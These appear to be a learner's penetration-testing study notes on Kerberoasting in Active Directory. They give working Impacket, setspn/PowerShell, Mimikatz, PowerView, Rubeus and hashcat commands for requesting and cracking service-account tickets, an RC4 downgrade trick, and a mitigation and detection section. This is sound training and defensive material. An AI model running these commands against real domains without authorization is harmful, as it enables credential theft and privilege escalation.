# Kerberoasting - from Linux
## Kerberoasting Overview
Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. Kerberoasting targets **SPN accounts,** which link services to the domain accounts running them. Services often use domain accounts instead of built-in accounts like LOCAL SERVICE. Any domain user can **request a Kerberos ticket for these accounts**, even across trusted forests. Performing the attack requires a **domain user account**, its password/NTLM hash, or **SYSTEM access on a domain-joined host.**

Domain accounts running services are often **local administrators, if not highly privileged domain accounts**.service accounts may be **granted administrator privileges on multiple servers across the enterprise**. Many services require elevated privileges on various systems, so service accounts are often added to **privileged groups, such as Domain Admins,** either directly or via nested membership.

Service accounts are often configured with **weak or reused password** . and sometimes the **password is the same as the username**.
if service account is cracked:
- you are likely to find yourself as a **local admin on multiple servers, if not Domain Admin**
- Even with **low-privilege accounts**, you can **access the service using the same service account** it runs under, e.g., SQL Server, and execute commands (like enabling `xp_cmdshell`).

check out the [talk](https://youtu.be/PUyhlN-E5MU) Tim Medin gave at Derbycon 2014, showcasing Kerberoasting to the world.
## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
## Efficacy of the Attack
- Cracking SPN tickets **may give high privileges** or just low-priv accounts for lateral movement.
- If no privileged tickets are cracked, report as **medium risk** to highlight SPN exposure, even if no compromise occurs.
- Risk assessment depends on **ticket results and password strength**.

## Performing the Attack
>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.
### Kerberoasting with GetUserSPNs.py
we need : **domain controller ip** + **authenticate to the Domain Controller** (a ==cleartext password, NT password hash, or even a Kerberos ticket(echo $KRB5CCNAME)==)
```bash
# tool location 
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -h
impacket-GetUserSPNs -h 

# Listing SPN Accounts with GetUserSPNs.py
impacket-GetUserSPNs -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER>

# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER> -request

# Requesting a Single TGS ticket for a specific account
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER> -request-user <USER-SVC>

# Saving the TGS Ticket to an Output File
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN.LOCAL>/<USER> -request-user <USER-SVC> -outputfile <USER-SRV_tgs>
```
#### Cracking the Ticket Offline with Hashcat
```bash
hashcat -m 13100  <USER-SRV_tgs> /usr/share/wordlists/rockyou.txt 
```
#### Testing Authentication against a Domain Controller
```bash
sudo crackmapexec smb 172.16.5.5 -u <USER-SVC> -p <USER-SVC-PASS>
```

---
# Kerberoasting - from Windows

## Kerberoasting - Semi Manual method
#### Enumerating SPNs with setspn.exe
```powershell
setspn.exe -Q */* # returned all SPNs
  # CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
  # MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
  # <SNIP>...

# Retrieving TGS for a Single User (sqldev) and load them into memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<MSSQLSvc/DEV-PRE-SQL.DOMAIN.LOCAL:1433>"

# Retrieving All TGS Using setspn.exe and load them into memory
setspn.exe -T <DOMAIN.LOCAL> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
#### Extracting Tickets from Memory with Mimikatz
```powershell
base64 /out:true # Enable base64 output for exported tickets
kerberos::list /export  # => # List Kerberos tickets in memory and export them to .kirbi files
```
If we don’t use `base64 /out:true` in Mimikatz, it saves tickets as `.kirbi` files.  
These can be moved to our attack machine and cracked directly, which is often easier if file transfer is simple.
#### Preparing the Base64 Blob for Cracking
```bash
echo "<base64 blob>" |  tr -d \\n > encoded_file # print + deletes all newline
cat encoded_file | base64 -d > sqldev.kirbi # Placing the Output into a File as .kirbi
python2.7 kirbi2john.py sqldev.kirbi # Extracting the Kerberos Ticket (TGS)

# Modifiying crack_file for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Viewing the Prepared Hash
cat sqldev_tgs_hashcat # $krb5tgs$23$*sqldev.kirbi*$813149fb2....
```
#### Cracking the Hash with Hashcat
```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt  
```

>If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
## Automated / Tool Based Route
#### Using PowerView to Enumerate SPN Accounts
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname,serviceprincipalname # list all users with SPNs

# Using PowerView to Target a Specific User
Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

cat .\ilfreight_tgs.csv # Viewing the Contents of the .CSV File
```
#### Using Rubeus
```powershell
.\Rubeus.exe
```
the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks
#### Check  the APNs Acoounts 
```powershell
.\Rubeus.exe kerberoast /stats
# [*] Total kerberoastable users : 9
#  | RC4_HMAC_DEFAULT                                 | 7     
#  | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     

# | Password Last Set Year | Count 
# ---------------------------------
# | 2022                   | 9     
```
- From the output we can see that there are 9 Kerberoastable users 7 of which support RC4 encryption for ticket requests and 2 of which support AES 128/256
- all 9 accounts had their password set this year 2022 
> if we saw any SPN accounts with their passwords set 5 or more years ago they could have a weak password that was set and never changed when the organization was less mature.

#### Request the TGS

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap # for privileged accounts
.\Rubeus.exe kerberoast /user:<USER> /nowrap # for specific user
```
`/nowrap` outputs the hash in one line easily **copied down** for offline cracking using Hashcat
**admincount=1** is an AD LDAP attribute marking accounts currently or formerly in ==privileged groups and protected by AdminSDHolder.== These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. 
## A Note on Encryption Types

-  hashes that begin with `$krb5tgs$23$*`, an **RC4** (type 23) encrypted ticket **easy in cracking**
-   hashes that begin with `$krb5tgs$18$*`, an **AES-256** (type 18) encrypted ticket is  **more time consuming in cracking** 
#### Checking Supported Encryption Types
```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
# msds-supportedencryptiontypes = 0 => not defined and set to default RC4_HMAC_MD5.
# msds-supportedencryptiontypes = 24 =>  AES-256 (type 18) encryption.

# or using rubeus.exe
.\Rubeus.exe kerberoast /stats
```

| Encryption Type  | Type | Hash Pattern    | `msds-supportedencryptiontypes` Value | Crack Speed             | Hashcat Mode |
| ---------------- | ---- | --------------- | ------------------------------------- | ----------------------- | ------------ |
| **RC4-HMAC-MD5** | 23   | `$krb5tgs$23$*` | `0` (default)                         | **Fast**                | **13100**    |
| **AES-128**      | 17   | `$krb5tgs$17$*` | `24` (AES enabled)                    | **Slower**              | **19600**    |
| **AES-256**      | 18   | `$krb5tgs$18$*` | `24` (AES enabled)                    | **More time-consuming** | **19700**    |
#### downgrade from AES to RC4
if we find ourselves in a domain with Domain Controllers running on **Server 2016 or earlier** (which is quite common) . **enabling AES will not partially mitigate Kerberoasting** by only returning AES encrypted tickets, which are much more difficult to crack, but rather **will allow an attacker to request an RC4 encrypted service ticket even though the supported encryption types are listed as AES 128/256.**
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /user:<USER> /nowrap # TGS with RC4 for specific user 
```
![[Pasted image 20250814213816.png]]
`/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a  TGS.
the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256.

#### edit the encryption types used by Kerberos.
It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for `RC4_HMAC_MD5` would allow for the above downgrade example to occur in 2019.
![[Pasted image 20250814214136.png]]


## Mitigation & Detection
- **Use Strong Passwords:** Long, complex passwords for non-managed service accounts. Prefer **MSA/gMSA** (auto-rotating) or **LAPS** for locals.
- **Enable Auditing:**
    ![[Pasted image 20250814220023.png]]
    > **GPMC** → **Edit GPO** → **Computer Config** → **Policies** → **Windows Settings** → **Security Settings** →  
    > **Advanced Audit Policy Config** → **Audit Policies** → **Account Logon** →  
    > **Audit Kerberos Service Ticket Operations** → **Success & Failure**.
    
    
- **Monitor Events:**
    - **4769** – TGS requested
    - **4770** – TGS renewed  
        Large bursts of **4769** with **EncType 0x17 (RC4)** may indicate Kerberoasting.
- **Extra Protection:** Restrict RC4 where possible and avoid privileged accounts as SPNs.

## Continuing Onwards

Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:

- Access a host via RDP or WinRM as a local user or a local admin
- Authenticate to a remote host as an admin using a tool such as PsExec
- Gain access to a sensitive file share
- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges

Regardless of our access, we will also want to dig deeper into the domain for other flaws and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.